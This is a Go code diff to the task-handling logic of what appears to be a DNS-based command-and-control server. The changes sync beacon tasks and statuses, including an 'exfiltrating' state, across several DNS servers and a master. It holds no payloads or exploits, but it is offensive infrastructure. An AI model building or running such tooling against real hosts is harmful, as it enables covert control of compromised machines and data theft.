@@ -923,6 +923,18 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 			TaskQueue: []Task{},
 		}
 		c2.beacons[beaconID] = beacon
+
+		// SHADOW MESH: Queue any pending tasks that were synced from Master before beacon arrived
+		// This handles the case where tasks are created on DNS Server A, but beacon checks into DNS Server B first
+		for _, task := range c2.tasks {
+			if task.BeaconID == beaconID && task.Status == "pending" {
+				beacon.TaskQueue = append(beacon.TaskQueue, *task)
+				if c2.debug {
+					logf("[C2] Queued pending task %s for newly registered beacon %s", task.ID, beaconID)
+				}
+			}
+		}
+
 		c2.mutex.Unlock()
 		// Always log new beacon registration (even if duplicate DNS query)
 		logf("[C2] New beacon: %s (%s@%s) %s/%s from %s", beaconID, username, hostname, os, arch, clientIP)
@@ -1205,7 +1217,7 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 					submitTaskID = masterTaskID
 				}
 
-				taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, 0, 1, res)
+				taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, 1, 1, res)
 				if err == nil && taskComplete {
 					// Master signaled task is complete - clear from beacon's current task
 					c2.mutex.Lock()
@@ -1269,7 +1281,7 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 		// Still try to save to DB even if not in memory
 		if c2.db != nil {
 			go func(tid, bid, res string) {
-				if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil {
+				if err := c2.db.SaveTaskResult(tid, bid, res, 1, 1); err != nil {
 					logf("[C2] Failed to save orphan task result to database: %v", err)
 				}
 			}(taskID, beaconID, result)
@@ -1281,7 +1293,7 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	// Save result to database (async)
 	if c2.db != nil {
 		go func(tid, bid, res string) {
-			if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
+			if err := c2.db.SaveTaskResult(tid, bid, res, 1, 1); err != nil && c2.debug {
 				logf("[C2] Failed to save task result to database: %v", err)
 			}
 			if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
@@ -1304,7 +1316,7 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 				submitTaskID = masterTaskID
 			}
 
-			taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, 0, 1, res)
+			taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, 1, 1, res)
 			if err != nil {
 				if c2.debug {
 					logf("[C2] Failed to submit result to master: %v", err)
@@ -2350,7 +2362,7 @@ func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) s
 		}(task)
 	}
 
-	// Add to beacon's task queue (only if beacon exists and not already queued)
+	// Add to beacon's task queue if beacon exists locally
 	if beacon, exists := c2.beacons[beaconID]; exists {
 		// CRITICAL: Don't add if this is the beacon's current task
 		if beacon.CurrentTask == taskID {
@@ -2375,11 +2387,15 @@ func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) s
 		} else if c2.debug {
 			logf("[C2] Task %s already queued for beacon %s (skipping duplicate)", taskID, beaconID)
 		}
-		return taskID
+	} else {
+		// Beacon doesn't exist yet on this DNS server (will be synced from Master)
+		// Task is saved in c2.tasks and will be queued when beacon checks in
+		if c2.debug {
+			logf("[C2] Task %s created for beacon %s (beacon not on this DNS server yet, will queue on first check-in)", taskID, beaconID)
+		}
 	}
 
-	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, taskID)
-	return ""
+	return taskID
 }
 
 // GetBeacons returns all registered beacons
@@ -2474,16 +2490,37 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 		return
 	}
 
-	// Only update if status changed to completed/failed/partial
-	if status == "completed" || status == "failed" || status == "partial" {
-		oldStatus := task.Status
-		task.Status = status
+	oldStatus := task.Status
 
-		if c2.debug {
-			logf("[DEBUG] Updated task %s status from master: %s → %s", taskID, oldStatus, status)
+	// Update to new status (handle all states: sent, exfiltrating, completed, failed, partial)
+	task.Status = status
+
+	if c2.debug && oldStatus != status {
+		logf("[DEBUG] Updated task %s status from master: %s → %s", taskID, oldStatus, status)
+	}
+
+	// If task is sent/exfiltrating on another DNS server, remove from local queue
+	if status == "sent" || status == "exfiltrating" {
+		if beacon, beaconExists := c2.beacons[task.BeaconID]; beaconExists {
+			// Remove from queue if present (another DNS server is handling it)
+			newQueue := []Task{}
+			removed := false
+			for _, queuedTask := range beacon.TaskQueue {
+				if queuedTask.ID != taskID {
+					newQueue = append(newQueue, queuedTask)
+				} else {
+					removed = true
+				}
+			}
+			if removed && c2.debug {
+				logf("[DEBUG] Removed task %s from beacon %s queue (being handled by another DNS server)", taskID, task.BeaconID)
+			}
+			beacon.TaskQueue = newQueue
 		}
+	}
 
-		// CRITICAL: Clear the beacon's current task so it can receive new tasks
+	// CRITICAL: Clear the beacon's current task when completed/failed/partial
+	if status == "completed" || status == "failed" || status == "partial" {
 		if beacon, beaconExists := c2.beacons[task.BeaconID]; beaconExists {
 			if beacon.CurrentTask == taskID {
 				beacon.CurrentTask = ""
@@ -2492,17 +2529,15 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 				}
 			}
 		}
+	}
 
-		// No mapping cleanup needed - we use Master IDs directly
-
-		// Update database
-		if c2.db != nil {
-			go func(tid, st string) {
-				if err := c2.db.UpdateTaskStatus(tid, st); err != nil && c2.debug {
-					logf("[C2] Failed to update task status in database: %v", err)
-				}
-			}(taskID, status)
-		}
+	// Update database
+	if c2.db != nil {
+		go func(tid, st string) {
+			if err := c2.db.UpdateTaskStatus(tid, st); err != nil && c2.debug {
+				logf("[C2] Failed to update task status in database: %v", err)
+			}
+		}(taskID, status)
 	}
 }
 
